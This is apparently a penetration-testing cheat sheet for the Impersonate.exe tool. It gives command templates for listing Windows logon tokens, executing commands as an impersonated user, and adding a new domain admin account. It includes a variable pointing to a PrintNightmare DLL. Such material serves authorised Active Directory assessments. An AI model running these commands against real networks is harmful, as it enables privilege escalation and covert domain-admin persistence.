# Impersonate

% impersonate, token, Active Directory

## List tokens
#assessment/AD #attack_type/Quickwin #access/Admin

List all logged-on users' tokens available on a host.

⚠️ Requirement : Local admin privileges on the target

```bash
Impersonate.exe list
```

## Execute commands
#assessment/AD #attack_type/Quickwin #access/Admin

Execute a command as an impersonated user.

⚠️ Requirement : Local admin privileges on the target

```bash
Impersonate.exe exec <token_id> <command>
```

## Add a domain admin
#assessment/AD #attack_type/Quickwin #access/NT_AUTHORITY\SYSTEM

Create a domain user and add it to the domain admin group, as an impersonated user.

⚠️ Requirement : Local NT AUTHORITY\System privileges on the target

```bash
Impersonate.exe adduser <token_id> <user> <password> <domain_admin_group> <dc-ip>
```

= ip: 192.168.1.0
= dc-ip: $DC_IP
= user: $USER
= password: $PASSWORD
= domain: $DOMAIN
= dll_path: EXEGOL\PrintNightmare.dll
